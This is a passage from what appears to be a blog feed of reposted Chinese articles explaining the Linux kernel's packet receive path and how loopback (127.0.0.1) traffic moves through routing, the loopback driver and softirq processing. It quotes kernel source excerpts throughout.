err;<br>&#125;<br></code></pre></td></tr></table></figure><p>上面我们说过这个对于udp协议的socket来说，这个<code>sk_prot</code>就是<code>net/ipv4/udp.c</code>下的<code>struct proto udp_prot</code>。由此我们找到了<code>udp_recvmsg</code>方法。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file: net/core/datagram.c:EXPORT_SYMBOL(__skb_recv_datagram);</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sk_buff</span> *__<span class="hljs-title">skb_recv_datagram</span>(<span class="hljs-keyword">struct</span> <span class="hljs-title">sock</span> *<span class="hljs-title">sk</span>, <span class="hljs-title">unsigned</span> <span class="hljs-title">int</span> <span class="hljs-title">flags</span>,</span><br><span class="hljs-class">                    <span class="hljs-title">int</span> *<span class="hljs-title">peeked</span>, <span class="hljs-title">int</span> *<span class="hljs-title">off</span>, <span class="hljs-title">int</span> *<span class="hljs-title">err</span>)</span><br><span class="hljs-class">&#123;</span><br>    ......<br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sk_buff_head</span> *<span class="hljs-title">queue</span> =</span> &amp;sk-&gt;sk_receive_queue;<br>        skb_queue_walk(<span class="hljs-built_in">queue</span>, skb) &#123;<br>            ......<br>        &#125;<br><br>        <span class="hljs-comment">/* User doesn&#x27;t want to wait */</span><br>        error = -EAGAIN;<br>        <span class="hljs-keyword">if</span> (!timeo)<br>            <span class="hljs-keyword">goto</span> no_packet;<br>    &#125; <span class="hljs-keyword">while</span> (!wait_for_more_packets(sk, err, &amp;timeo, last));<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>终于找到了我们想要看的重点，在上面我们看到了所谓的读取过程，就是访问<code>sk-&gt;sk_receive_queue</code>。如果没有数据，且用户也允许等待，则将调用wait_for_more_packets()执行等待操作，它加入会让用户进程进入睡眠状态。</p><h2 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h2><p>网络模块是Linux内核中最复杂的模块了，看起来一个简简单单的收包过程就涉及到许多内核组件之间的交互，如网卡驱动、协议栈，内核ksoftirqd线程等。 看起来很复杂，本文想通过图示的方式，尽量以容易理解的方式来将内核收包过程讲清楚。现在让我们再串一串整个收包过程。</p><p>当用户执行完<code>recvfrom</code>调用后，用户进程就通过系统调用进行到内核态工作了。如果接收队列没有数据，进程就进入睡眠状态被操作系统挂起。这块相对比较简单，剩下大部分的戏份都是由Linux内核其它模块来表演了。</p><p>首先在开始收包之前，Linux要做许多的准备工作：</p><ul><li><ol><li>创建ksoftirqd线程，为它设置好它自己的线程函数，后面就指望着它来处理软中断呢。</li></ol></li><li><ol start="2"><li>协议栈注册，linux要实现许多协议，比如arp，icmp，ip，udp，tcp，每一个协议都会将自己的处理函数注册一下，方便包来了迅速找到对应的处理函数</li></ol></li><li><ol start="3"><li>网卡驱动初始化，每个驱动都有一个初始化函数，内核会让驱动也初始化一下。在这个初始化过程中，把自己的DMA准备好，把NAPI的poll函数地址告诉内核</li></ol></li><li><ol start="4"><li>启动网卡，分配RX，TX队列，注册中断对应的处理函数</li></ol></li></ul><p>以上是内核准备收包之前的重要工作，当上面都ready之后，就可以打开硬中断，等待数据包的到来了。</p><p>当数据到来了以后，第一个迎接它的是网卡（我去，这不是废话么）：</p><ul><li><ol><li>网卡将数据帧DMA到内存的RingBuffer中，然后向CPU发起中断通知</li></ol></li><li><ol start="2"><li>CPU响应中断请求，调用网卡启动时注册的中断处理函数</li></ol></li><li><ol start="3"><li>中断处理函数几乎没干啥，就发起了软中断请求</li></ol></li><li><ol start="4"><li>内核线程ksoftirqd线程发现有软中断请求到来，先关闭硬中断</li></ol></li><li><ol start="5"><li>ksoftirqd线程开始调用驱动的poll函数收包</li></ol></li><li><ol start="6"><li>poll函数将收到的包送到协议栈注册的ip_rcv函数中</li></ol></li><li><ol start="7"><li>ip_rcv函数再讲包送到udp_rcv函数中（对于tcp包就送到tcp_rcv）</li></ol></li></ul><p>我们在用户层看到的简单一行<code>recvfrom</code>,Linux内核要替我们做如此之多的工作，才能让我们顺利收到数据。这还是简简单单的UDP，如果是TCP，内核要做的工作更多。</p><p>理解了整个收包过程以后，我们就能明确知道Linux收一个包的CPU开销了。首先第一块是用户进程调用系统调用陷入内核态的开销。第二块是CPU响应包的硬中断的CPU开销。第三块是ksoftirqd内核线程的软中断上下文花费的。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://link.zhihu.com/?target=https://blog.packagecloud.io/eng/2016/06/22/monitoring-tuning-linux-networking-stack-receiving-data/">Monitoring and Tuning the Linux Networking Stack: Receiving Data</a></li><li><a href="https://link.zhihu.com/?target=https://segmentfault.com/a/1190000008836467">Linux网络数据包接收过程</a></li><li><a href="https://link.zhihu.com/?target=https://www.jianshu.com/p/09bb5d5a72ba">RPS和RFS网卡多队列性能调优实践</a></li><li><a href="https://link.zhihu.com/?target=https://juejin.im/post/6844903479803117575">网卡收包流程</a></li><li><a href="https://link.zhihu.com/?target=https://www.cnblogs.com/nju347/p/8436641.html">Linux网络管理（一）：网卡驱动与Linux内核</a></li><li><a href="https://link.zhihu.com/?target=https://www.jianshu.com/p/5d82a685b5b6">linux内核中socket的创建过程源码分析（总结性质）</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>127.0.0.1 之本机网络通信过程</title>
    <link href="/2022/11/25/127-0-0-1%E4%B9%8B%E6%9C%AC%E6%9C%BA%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1%E8%BF%87%E7%A8%8B/"/>
    <url>/2022/11/25/127-0-0-1%E4%B9%8B%E6%9C%AC%E6%9C%BA%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1%E8%BF%87%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[ <meta name="referrer" content="no-referrer">#                          127.0.0.1 之本机网络通信过程<blockquote><p>转载自张彦飞大佬的 <a href="https://mp.weixin.qq.com/s/6_OfoeD3ZpyQisY2F-4_bw">127.0.0.1 之本机网络通信过程知多少 ?！</a></p></blockquote><h2 id="一、跨机网路通信过程"><a href="#一、跨机网路通信过程" class="headerlink" title="一、跨机网路通信过程"></a>一、跨机网路通信过程</h2><h3 id="1-1-跨机数据发送"><a href="#1-1-跨机数据发送" class="headerlink" title="1.1 跨机数据发送"></a>1.1 跨机数据发送</h3><p>从 send 系统调用开始，直到网卡把数据发送出去，整体流程如下：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/BBjAFF4hcwpyWdN4tva34saOuQBulk5CtNNS4rib0ib9pTra3xou3Zxic3wNhyLdjmS3X7aqst5UGA1fkhge6UNPA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>在这幅图中，我们看到用户数据被拷贝到内核态，然后经过协议栈处理后进入到了 RingBuffer 中。随后网卡驱动真正将数据发送了出去。当发送完成的时候，是通过硬中断来通知 CPU，然后清理 RingBuffer。</p><p>不过上面这幅图并没有很好地把内核组件和源码展示出来，我们再从代码的视角看一遍。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/BBjAFF4hcwpyWdN4tva34saOuQBulk5C93plswfSHZf9icick9Php8dhuKyJYp6Bl6SQb5Bmib9icbXCP89yn43IBg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>等网络发送完毕之后。网卡在发送完毕的时候，会给 CPU 发送一个硬中断来通知 CPU。收到这个硬中断后会释放 RingBuffer 中使用的内存。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/BBjAFF4hcwpyWdN4tva34saOuQBulk5CibkE1WRP30JdSBVqJa9ljuJEmQMhlVBkR9zAPIPDnRhzYqwgGv6qTUg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><h3 id="1-2-跨机数据接收"><a href="#1-2-跨机数据接收" class="headerlink" title="1.2 跨机数据接收"></a>1.2 跨机数据接收</h3><p>当数据包到达另外一台机器的时候，Linux 数据包的接收过程开始了。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/BBjAFF4hcwpyWdN4tva34saOuQBulk5CNPiaAeicPRxibhHt5jGdSB9MKv643hCyibe0D3tEcRzeZQZU5ibUT5SEBPw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>当网卡收到数据以后，CPU发起一个中断，以通知 CPU 有数据到达。当CPU收到中断请求后，会去调用网络驱动注册的中断处理函数，触发软中断。ksoftirqd 检测到有软中断请求到达，开始轮询收包，收到后交由各级协议栈处理。当协议栈处理完并把数据放到接收队列的之后，唤醒用户进程（假设是阻塞方式）。</p><p>我们再同样从内核组件和源码视角看一遍。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/BBjAFF4hcwpyWdN4tva34saOuQBulk5CfgMT8QPLb2WgYrakI0rptOMLicdGia9Nxo6FaKBLtGPbDBqQehlqib9jA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><h3 id="1-3-跨机网络通信汇总"><a href="#1-3-跨机网络通信汇总" class="headerlink" title="1.3 跨机网络通信汇总"></a>1.3 跨机网络通信汇总</h3><p><img src="https://mmbiz.qpic.cn/mmbiz_png/BBjAFF4hcwpyWdN4tva34saOuQBulk5CRmtMBiacq2Ph94hkMD69bQzglgF8VYXAV2ax52dnHg9WiaMv6Lic6lvFw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><h2 id="二、本机发送过程"><a href="#二、本机发送过程" class="headerlink" title="二、本机发送过程"></a>二、本机发送过程</h2><p>在第一节中，我们看到了跨机时整个网络发送过程（嫌第一节流程图不过瘾，想继续看源码了解细节的同学可以参考 <a href="https://mp.weixin.qq.com/s?__biz=MjM5Njg5NDgwNA==&mid=2247485146&idx=1&sn=e5bfc79ba915df1f6a8b32b87ef0ef78&scene=21#wechat_redirect">拆解 Linux 网络包发送过程</a>） 。</p><p>在本机网络 IO 的过程中，流程会有一些差别。为了突出重点，将不再介绍整体流程，而是只介绍和跨机逻辑不同的地方。有差异的地方总共有两个，分别是<strong>路由</strong>和<strong>驱动程序</strong>。</p><h3 id="2-1-网络层路由"><a href="#2-1-网络层路由" class="headerlink" title="2.1 网络层路由"></a>2.1 网络层路由</h3><p>发送数据会进入协议栈到网络层的时候，网络层入口函数是 ip_queue_xmit。在网络层里会进行路由选择，路由选择完毕后，再设置一些 IP 头、进行一些 netfilter 的过滤后，将包交给邻居子系统。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/BBjAFF4hcwpyWdN4tva34saOuQBulk5CD7TD2J1iaJYpjSI7kBbMCTxzqEGnrKAKOt1nUC9369icylPYBnT9Y6Ew/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>对于本机网络 IO 来说，特殊之处在于在 local 路由表中就能找到路由项，对应的设备都将使用 loopback 网卡，也就是我们常见的 lo。</p><p>我们来详细看看路由网络层里这段路由相关工作过程。从网络层入口函数 ip_queue_xmit 看起。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">//file: net/ipv4/ip_output.c</span><br><span class="hljs-built_in">int</span> ip<span class="hljs-constructor">_queue_xmit(<span class="hljs-params">struct</span> <span class="hljs-params">sk_buff</span> <span class="hljs-operator">*</span><span class="hljs-params">skb</span>, <span class="hljs-params">struct</span> <span class="hljs-params">flowi</span> <span class="hljs-operator">*</span><span class="hljs-params">fl</span>)</span><br>&#123;<br> <span class="hljs-comment">//检查 socket 中是否有缓存的路由表</span><br> rt = (<span class="hljs-keyword">struct</span> rtable *)<span class="hljs-constructor">__sk_dst_check(<span class="hljs-params">sk</span>, 0)</span>;<br> <span class="hljs-keyword">if</span> (rt<span class="hljs-operator"> == </span>NULL) &#123;<br>  <span class="hljs-comment">//没有缓存则展开查找</span><br>  <span class="hljs-comment">//则查找路由项， 并缓存到 socket 中</span><br>  rt = ip<span class="hljs-constructor">_route_output_ports(<span class="hljs-operator">...</span>)</span>;<br>  sk<span class="hljs-constructor">_setup_caps(<span class="hljs-params">sk</span>, &amp;<span class="hljs-params">rt</span>-&gt;<span class="hljs-params">dst</span>)</span>;<br> &#125;<br></code></pre></td></tr></table></figure><p>查找路由项的函数是 ip_route_output_ports，它又依次调用到 ip_route_output_flow、__ip_route_output_key、fib_lookup。调用过程省略掉，直接看 fib_lookup 的关键代码。</p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs verilog"><span class="hljs-comment">//file:include/net/ip_fib.h</span><br><span class="hljs-keyword">static</span> inline <span class="hljs-keyword">int</span> fib_lookup(<span class="hljs-keyword">struct</span> net *net, <span class="hljs-keyword">const</span> <span class="hljs-keyword">struct</span> flowi4 *flp,<br>        <span class="hljs-keyword">struct</span> fib_result *res)<br>&#123;<br> <span class="hljs-keyword">struct</span> fib_table *<span class="hljs-keyword">table</span>;<br><br> <span class="hljs-keyword">table</span> = fib_get_table(net, RT_TABLE_LOCAL);<br> <span class="hljs-keyword">if</span> (!fib_table_lookup(<span class="hljs-keyword">table</span>, flp, res, FIB_LOOKUP_NOREF))<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br> <span class="hljs-keyword">table</span> = fib_get_table(net, RT_TABLE_MAIN);<br> <span class="hljs-keyword">if</span> (!fib_table_lookup(<span class="hljs-keyword">table</span>, flp, res, FIB_LOOKUP_NOREF))<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br> <span class="hljs-keyword">return</span> -ENETUNREACH;<br>&#125;<br></code></pre></td></tr></table></figure><p>在 fib_lookup 将会对 local 和 main 两个路由表展开查询，并且是先查 local 后查询 main。我们在 Linux 上使用命令名可以查看到这两个路由表， 这里只看 local 路由表（因为本机网络 IO 查询到这个表就终止了）。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#ip route list table local</span><br><span class="hljs-attribute">local</span> <span class="hljs-number">10</span>.<span class="hljs-number">143</span>.x.y dev eth0 proto kernel scope host src <span class="hljs-number">10</span>.<span class="hljs-number">143</span>.x.y<br><span class="hljs-attribute">local</span> <span class="hljs-number">127.0.0.1</span> dev lo proto kernel scope host src <span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure><p>从上述结果可以看出，对于目的是 127.0.0.1 的路由在 local 路由表中就能够找到了。fib_lookup 工作完成，返回__ip_route_output_key 继续。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">//file: net/ipv4/route.c</span><br><span class="hljs-keyword">struct</span> rtable *<span class="hljs-constructor">__ip_route_output_key(<span class="hljs-params">struct</span> <span class="hljs-params">net</span> <span class="hljs-operator">*</span><span class="hljs-params">net</span>, <span class="hljs-params">struct</span> <span class="hljs-params">flowi4</span> <span class="hljs-operator">*</span><span class="hljs-params">fl4</span>)</span><br>&#123;<br> <span class="hljs-keyword">if</span> (fib<span class="hljs-constructor">_lookup(<span class="hljs-params">net</span>, <span class="hljs-params">fl4</span>, &amp;<span class="hljs-params">res</span>)</span>) &#123;<br> &#125;<br> <span class="hljs-keyword">if</span> (res.<span class="hljs-keyword">type</span><span class="hljs-operator"> == </span>RTN_LOCAL) &#123;<br>  dev_out = net-&gt;loopback_dev;<span class="hljs-operator"></span><br><span class="hljs-operator">  ...</span><br><span class="hljs-operator"> </span>&#125;<br><br> rth = <span class="hljs-constructor">__mkroute_output(&amp;<span class="hljs-params">res</span>, <span class="hljs-params">fl4</span>, <span class="hljs-params">orig_oif</span>, <span class="hljs-params">dev_out</span>, <span class="hljs-params">flags</span>)</span>;<br> return rth;<br>&#125;<br></code></pre></td></tr></table></figure><p>对于是本机的网络请求，设备将全部都使用 net-&gt;loopback_dev,也就是 lo 虚拟网卡。</p><p>接下来的网络层仍然和跨机网络 IO 一样，最终会经过 ip_finish_output，最终进入到 邻居子系统的入口函数 dst_neigh_output 中。</p><blockquote><p>本机网络 IO 需要进行 IP 分片吗？因为和正常的网络层处理过程一样会经过 ip_finish_output 函数。在这个函数中，如果 skb 大于 MTU 的话，仍然会进行分片。只不过 lo 的 MTU 比 Ethernet 要大很多。通过 ifconfig 命令就可以查到，普通网卡一般为 1500，而 lo 虚拟接口能有 65535。</p></blockquote><p>在邻居子系统函数中经过处理，进入到网络设备子系统（入口函数是 dev_queue_xmit）。</p><h3 id="2-2-网络设备子系统"><a href="#2-2-网络设备子系统" class="headerlink" title="2.2 网络设备子系统"></a>2.2 网络设备子系统</h3><p>网络设备子系统的入口函数是 dev_queue_xmit。简单回忆下之前讲述跨机发送过程的时候，对于真的有队列的物理设备，在该函数中进行了一系列复杂的排队等处理以后，才调用 dev_hard_start_xmit，从这个函数 再进入驱动程序来发送。在这个过程中，甚至还有可能会触发软中断来进行发送，流程如图：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/BBjAFF4hcwpyWdN4tva34saOuQBulk5Ctc20kJxUOP9zo3ddG9mQIS6qej4OaHtp5gWICickqec7ic75IYicHDpoA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>但是对于启动状态的回环设备来说（q-&gt;enqueue 判断为 false），就简单多了。没有队列的问题，直接进入 dev_hard_start_xmit。接着进入回环设备的“驱动”里的发送回调函数 loopback_xmit，将 skb “发送”出去。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/BBjAFF4hcwpyWdN4tva34saOuQBulk5CtH4JjkvicnMwjfsT8N84tia2iaFicsJeVlA6bHOx0hRb6z1A7jL9ic2vVCA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>我们来看下详细的过程，从网络设备子系统的入口 dev_queue_xmit 看起。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">//file: net/core/dev.c</span><br><span class="hljs-built_in">int</span> dev<span class="hljs-constructor">_queue_xmit(<span class="hljs-params">struct</span> <span class="hljs-params">sk_buff</span> <span class="hljs-operator">*</span><span class="hljs-params">skb</span>)</span><br>&#123;<br> q = rcu<span class="hljs-constructor">_dereference_bh(<span class="hljs-params">txq</span>-&gt;<span class="hljs-params">qdisc</span>)</span>;<br> <span class="hljs-keyword">if</span> (q-&gt;enqueue) &#123;<span class="hljs-comment">//回环设备这里为 false</span><br>  rc = <span class="hljs-constructor">__dev_xmit_skb(<span class="hljs-params">skb</span>, <span class="hljs-params">q</span>, <span class="hljs-params">dev</span>, <span class="hljs-params">txq</span>)</span>;<br>  goto out;<br> &#125;<br><br> <span class="hljs-comment">//开始回环设备处理</span><br> <span class="hljs-keyword">if</span> (dev-&gt;flags &amp; IFF_UP) &#123;<br>  dev<span class="hljs-constructor">_hard_start_xmit(<span class="hljs-params">skb</span>, <span class="hljs-params">dev</span>, <span class="hljs-params">txq</span>, <span class="hljs-operator">...</span>)</span>;<span class="hljs-operator"></span><br><span class="hljs-operator">  ...</span><br><span class="hljs-operator"> </span>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在 dev_hard_start_xmit 中还是将调用设备驱动的操作函数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//file: net/core/dev.c</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">dev_hard_start_xmit</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sk_buff *skb, <span class="hljs-keyword">struct</span> net_device *dev,</span></span><br><span class="hljs-params"><span class="hljs-function">   <span class="hljs-keyword">struct</span> netdev_queue *txq)</span></span><br><span class="hljs-function"></span>&#123;<br> <span class="hljs-comment">//获取设备驱动的回调函数集合 ops</span><br> <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">net_device_ops</span> *ops = dev-&gt;netdev_ops;<br><br> <span class="hljs-comment">//调用驱动的 ndo_start_xmit 来进行发送</span><br> rc = ops-&gt;<span class="hljs-built_in">ndo_start_xmit</span>(skb, dev);<br> ...<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-3-“驱动”程序"><a href="#2-3-“驱动”程序" class="headerlink" title="2.3 “驱动”程序"></a>2.3 “驱动”程序</h3><p>对于真实的 igb 网卡来说，它的驱动代码都在 drivers&#x2F;net&#x2F;ethernet&#x2F;intel&#x2F;igb&#x2F;igb_main.c 文件里。顺着这个路子，我找到了 loopback 设备的“驱动”代码位置：drivers&#x2F;net&#x2F;loopback.c。在 drivers&#x2F;net&#x2F;loopback.c</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-comment">//file:drivers/net/loopback.c</span><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">net_device_ops</span> loopback_ops = &#123;<br> .ndo_init      = loopback_dev_init,<br> .ndo_start_xmit= loopback_xmit,<br> .ndo_get_stats64 = loopback_get_stats64,<br>&#125;;<br></code></pre></td></tr></table></figure><p>所以对 dev_hard_start_xmit 调用实际上执行的是 loopback “驱动” 里的 loopback_xmit。为什么我把“驱动”加个引号呢，因为 loopback 是一个纯软件性质的虚拟接口，并没有真正意义上的驱动，它的工作流程大致如图。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/BBjAFF4hcwpyWdN4tva34saOuQBulk5Ces94YxSDic0LcDhIy4SZJdr0R0RbwdXFiaA23H561DvjhKsLCc4hAcMQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>我们再来看详细的代码。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-comment">//file:drivers/net/loopback.c</span><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">netdev_tx_t</span> <span class="hljs-title">loopback_xmit</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sk_buff *skb,</span></span><br><span class="hljs-params"><span class="hljs-function">     <span class="hljs-keyword">struct</span> net_device *dev)</span></span><br><span class="hljs-function"></span>&#123;<br> <span class="hljs-comment">//剥离掉和原 socket 的联系</span><br> <span class="hljs-built_in">skb_orphan</span>(skb);<br><br> <span class="hljs-comment">//调用netif_rx</span><br> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">likely</span>(<span class="hljs-built_in">netif_rx</span>(skb) == NET_RX_SUCCESS)) &#123;<br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在 skb_orphan 中先是把 skb 上的 socket 指针去掉了（剥离了出来）。</p><blockquote><p>注意，在本机网络 IO 发送的过程中，传输层下面的 skb 就不需要释放了，直接给接收方传过去就行了。总算是省了一点点开销。不过可惜传输层的 skb 同样节约不了，还是得频繁地申请和释放。</p></blockquote><p>接着调用 netif_rx，在该方法中 中最终会执行到 enqueue_to_backlog 中（netif_rx -&gt; netif_rx_internal -&gt; enqueue_to_backlog）。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//file: net/core/dev.c</span><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title">enqueue_to_backlog</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sk_buff *skb, <span class="hljs-type">int</span> cpu,</span></span><br><span class="hljs-params"><span class="hljs-function">         <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *qtail)</span></span><br><span class="hljs-function"></span>&#123;<br> sd = &amp;<span class="hljs-built_in">per_cpu</span>(softnet_data, cpu);<br><br> ...<br> __skb_queue_tail(&amp;sd-&gt;input_pkt_queue, skb);<br><br> ...<br> ____napi_schedule(sd, &amp;sd-&gt;backlog);<br></code></pre></td></tr></table></figure><p>在 enqueue_to_backlog 把要发送的 skb 插入 softnet_data-&gt;input_pkt_queue 队列中并调用 ____napi_schedule 来触发软中断。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-comment">//file:net/core/dev.c</span><br>static inline void <span class="hljs-built_in">____napi_schedule</span>(struct softnet_data *sd,<br>         struct napi_struct *napi)<br>&#123;<br> <span class="hljs-built_in">list_add_tail</span>(&amp;napi-&gt;poll_list, &amp;sd-&gt;poll_list);<br> <span class="hljs-built_in">__raise_softirq_irqoff</span>(NET_RX_SOFTIRQ);<br>&#125;<br></code></pre></td></tr></table></figure><p>只有触发完软中断，发送过程就算是完成了。</p><h2 id="三、本机接收过程"><a href="#三、本机接收过程" class="headerlink" title="三、本机接收过程"></a>三、本机接收过程</h2><p>在跨机的网络包的接收过程中，需要经过硬中断，然后才能触发软中断。而在本机的网络 IO 过程中，由于并不真的过网卡，所以网卡实际传输，硬中断就都省去了。直接从软中断开始，经过 process_backlog 后送进协议栈，大体过程如图。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/BBjAFF4hcwpyWdN4tva34saOuQBulk5Cr5j7vqZytONcBluZXd5hs2Ue8BqTibnLSP4eC5ubaSz4Cn3uMnNobZg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>接下来我们再看更详细一点的过程。</p><p>在软中断被触发以后，会进入到 NET_RX_SOFTIRQ 对应的处理方法 net_rx_action 中（至于细节参见 <a href="https://mp.weixin.qq.com/s?__biz=MjM5Njg5NDgwNA==&mid=2247484058&idx=1&sn=a2621bc27c74b313528eefbc81ee8c0f&scene=21#wechat_redirect">图解Linux网络包接收过程</a> 一文中的 3.2 小节）。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">//file: net/core/dev.c</span><br>static void net<span class="hljs-constructor">_rx_action(<span class="hljs-params">struct</span> <span class="hljs-params">softirq_action</span> <span class="hljs-operator">*</span><span class="hljs-params">h</span>)</span>&#123;<br> <span class="hljs-keyword">while</span> (!<span class="hljs-built_in">list</span><span class="hljs-constructor">_empty(&amp;<span class="hljs-params">sd</span>-&gt;<span class="hljs-params">poll_list</span>)</span>) &#123;<br>  work = n-&gt;poll(n, weight);<br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们还记得对于 igb 网卡来说，poll 实际调用的是 igb_poll 函数。那么 loopback 网卡的 poll 函数是谁呢？由于poll_list 里面是 <code>struct softnet_data</code> 对象，我们在 net_dev_init 中找到了蛛丝马迹。</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 